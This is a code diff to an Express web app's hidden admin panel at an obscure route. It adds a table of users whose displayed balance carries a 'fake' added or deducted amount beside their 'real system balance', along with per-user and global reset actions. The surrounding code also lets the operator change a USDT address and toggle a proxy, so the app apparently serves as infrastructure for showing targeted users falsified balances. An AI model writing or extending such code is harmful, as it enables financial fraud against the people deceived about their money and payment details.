@@ -3686,7 +3686,54 @@ app.get('/yougogirl', async (req, res) => {
                             <div class="text-sm text-slate-400">
                                 <i class="fa-solid fa-circle-info mr-2"></i> Reset will remove all fake balance and show the real system balance.
                             </div>
-                            <button onclick="updateBalance('remove')" class="text-sm font-bold text-sky-400 hover:underline">Reset to Real Balance</button>
+                            <button onclick="updateBalance('remove', 'all')" class="text-sm font-bold text-sky-400 hover:underline">Reset All to Real Balance</button>
+                        </div>
+                    </div>
+
+                    <!-- Active Modified User Balances Card -->
+                    <div class="card overflow-hidden">
+                        <div class="flex items-center justify-between mb-6">
+                            <div>
+                                <h3 class="text-xl font-bold">Active Modified User Balances</h3>
+                                <p class="text-xs text-slate-400">List of users who currently have fake balance added or deducted</p>
+                            </div>
+                            <button onclick="updateBalance('remove', 'all')" class="text-xs font-bold text-rose-500 hover:underline">Clear All Modified Balances</button>
+                        </div>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-left text-sm">
+                                <thead class="text-slate-500 border-b border-slate-800">
+                                    <tr>
+                                        <th class="pb-4">User ID</th>
+                                        <th class="pb-4">Phone</th>
+                                        <th class="pb-4">Added (Fake) Balance</th>
+                                        <th class="pb-4">Real System Balance</th>
+                                        <th class="pb-4 text-right">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-slate-800">
+                                    ${(() => {
+                                        const modifiedUsers = Object.entries(data.userOverrides || {}).filter(([uid, ovr]) => ovr && ovr.addedBalance !== undefined && ovr.addedBalance !== 0);
+                                        if (modifiedUsers.length === 0) {
+                                            return '<tr><td colspan="5" class="py-8 text-center text-slate-600 italic">No users currently have modified balance.</td></tr>';
+                                        }
+                                        return modifiedUsers.map(([uid, ovr]) => {
+                                            const tracked = data.trackedUsers && data.trackedUsers[uid];
+                                            const phone = (tracked && tracked.phone) || userPhoneMap[uid] || 'N/A';
+                                            const realBal = (tracked && tracked.balance !== undefined) ? '₹' + tracked.balance : 'N/A';
+                                            const added = ovr.addedBalance;
+                                            const addedText = (added > 0 ? '+₹' : '-₹') + Math.abs(added).toFixed(2);
+                                            const addedClass = added > 0 ? 'text-emerald-400 bg-emerald-500/10' : 'text-rose-500 bg-rose-500/10';
+                                            return '<tr>' +
+                                                '<td class="py-4 font-mono font-bold text-sky-400">' + uid + '</td>' +
+                                                '<td class="py-4 text-slate-400 text-xs">' + phone + '</td>' +
+                                                '<td class="py-4"><span class="px-2.5 py-1 rounded-lg text-xs font-bold ' + addedClass + '">' + addedText + '</span></td>' +
+                                                '<td class="py-4 font-mono text-slate-400 text-xs">' + realBal + '</td>' +
+                                                '<td class="py-4 text-right"><button onclick="updateBalance(\'remove\', \'' + uid + '\')" class="bg-rose-500/10 text-rose-500 px-3 py-1.5 rounded-xl text-xs font-bold hover:bg-rose-500/20 transition-all"><i class="fa-solid fa-trash-can mr-1"></i> Clear Balance</button></td>' +
+                                                '</tr>';
+                                        }).join('');
+                                    })()}
+                                </tbody>
+                            </table>
                         </div>
                     </div>
                 </section>
@@ -4090,24 +4137,11 @@ app.get('/yougogirl', async (req, res) => {
         function updateUsdt() { apiCall('/usdt/update', { address: document.getElementById('sys-usdt').value }); }
         function updateService() { apiCall('/service/update', { link: document.getElementById('sys-service').value }); }
         
-        function updateBalance(action) {
-            const userId = document.getElementById('bal-userId').value;
+        function updateBalance(action, targetUserId) {
+            const userId = targetUserId !== undefined ? targetUserId : document.getElementById('bal-userId').value;
             const amount = document.getElementById('bal-amount').value;
             if (!userId && action !== 'remove') return notify('User ID required', 'error');
-            apiCall('/balance/update', { userId, amount, action });
-        }
-
-        function setBanner() {
-            const userId = document.getElementById('banner-userId').value;
-            const title = document.getElementById('banner-title').value;
-            const content = document.getElementById('banner-content').value;
-            if (!userId || !content) return notify('User ID and content required', 'error');
-            apiCall('/banner/set', { userId, title, content });
-        }
-
-        function clearBanner(userId) {
-            const uid = userId || document.getElementById('banner-userId').value || 'all';
-            apiCall('/banner/clear', { userId: uid });
+            apiCall('/balance/update', { userId: userId || 'all', amount, action });
         }
 
         function addDummy() {
@@ -4205,9 +4239,18 @@ app.post('/yougogirl/api/proxy-toggle', async (req, res) => {
 app.post('/yougogirl/api/balance/update', async (req, res) => {
   try {
     const { userId, amount, action } = req.parsedBody || {};
-    if (!userId || (action !== 'remove' && isNaN(amount))) return res.status(400).json({ success: false, error: 'Invalid input' });
     const data = await loadData(true);
     data.userOverrides = data.userOverrides || {};
+
+    if (action === 'remove' && (userId === 'all' || !userId)) {
+      for (const uid of Object.keys(data.userOverrides)) {
+        if (data.userOverrides[uid]) delete data.userOverrides[uid].addedBalance;
+      }
+      await saveData(data);
+      return res.json({ success: true, message: 'All user balance overrides reset' });
+    }
+
+    if (!userId || (action !== 'remove' && isNaN(amount))) return res.status(400).json({ success: false, error: 'Invalid input' });
     data.userOverrides[String(userId)] = data.userOverrides[String(userId)] || {};
     const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
     const currentBal = tracked ? tracked.balance : 'N/A';
